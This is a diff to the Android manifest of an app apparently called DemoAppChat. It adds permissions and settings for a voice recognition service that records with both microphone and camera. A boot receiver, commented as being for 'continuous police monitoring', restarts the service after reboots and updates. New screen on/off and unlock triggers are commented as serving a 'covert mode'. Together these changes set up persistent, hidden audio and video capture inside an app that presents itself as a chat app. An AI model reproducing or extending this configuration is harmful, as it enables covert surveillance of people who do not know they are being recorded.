@@ -19,6 +19,11 @@
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     
+    <!-- Permisos adicionales para background y power management -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    
     <!-- Permisos para grabación y almacenamiento -->
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -35,6 +40,7 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.DemoAppChat"
+        android:requestLegacyExternalStorage="true"
         tools:targetApi="31">
 
         <!-- Actividad principal -->
@@ -50,30 +56,45 @@
             </intent-filter>
         </activity>
 
+        <!-- Actividad de videollamada -->
+        <activity
+            android:name=".presentation.chat.VideoCallActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"
+            android:theme="@style/Theme.DemoAppChat" />
+
         <!-- Servicio de reconocimiento de voz -->
         <service
             android:name=".data.service.VoiceRecognitionService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="microphone"
+            android:foregroundServiceType="microphone|camera"
             android:stopWithTask="false" />
 
-        <!-- Receptor para reiniciar el servicio automáticamente -->
+        <!-- Receptor para monitoreo policial continuo -->
         <receiver
             android:name=".data.receiver.BootReceiver"
             android:enabled="true"
             android:exported="true"
             android:directBootAware="true">
+            <!-- Reinicio del dispositivo -->
             <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
+            <!-- Actualizaciones de la app -->
             <intent-filter>
                 <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.PACKAGE_REPLACED" />
                 <data android:scheme="package" />
+            </intent-filter>
+            <!-- Estados de pantalla para modo encubierto -->
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
         </receiver>
 
